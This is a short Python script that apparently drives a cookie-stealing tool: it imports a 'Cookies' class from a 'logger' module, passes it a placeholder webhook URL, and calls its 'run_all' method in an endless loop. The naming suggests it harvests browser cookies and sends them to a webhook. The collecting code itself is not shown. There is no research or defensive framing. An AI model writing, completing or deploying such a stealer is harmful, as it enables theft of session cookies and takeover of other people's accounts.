from logger import Cookies

log = Cookies('weebhook url here')

def main():
  while True:
	log.run_all()

if __name__ == '__main__':
	main()
